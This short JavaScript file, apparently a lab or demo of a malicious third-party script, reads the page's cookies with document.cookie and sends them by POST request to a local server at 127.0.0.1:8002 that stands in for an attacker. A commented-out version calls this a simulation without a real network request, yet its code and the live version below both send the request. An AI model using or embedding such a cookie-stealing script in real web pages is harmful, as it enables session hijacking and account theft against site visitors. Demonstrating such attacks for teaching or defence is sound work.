// // Malicious script trying to steal cookies
// console.log("[malicious_third_party.js] Malicious third party script running");

// function stealCookies() {

//     const cookies = document.cookie;
//     console.log(`[malicious_third_party.js] Cookies accessed: ${cookies}`);
    
//     // Simulate sending cookies to an attacker server (no actual network request for this demo)
//     fetch('http://127.0.0.1:8002', { method: 'POST', body: JSON.stringify({ cookies }) });
// }

// stealCookies();

fetch('http://127.0.0.1:8002/', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ cookie: document.cookie })
  })
  .then(response => response.text())
  .then(data => console.log('Success:', data))
  .catch(error => console.error('Error:', error));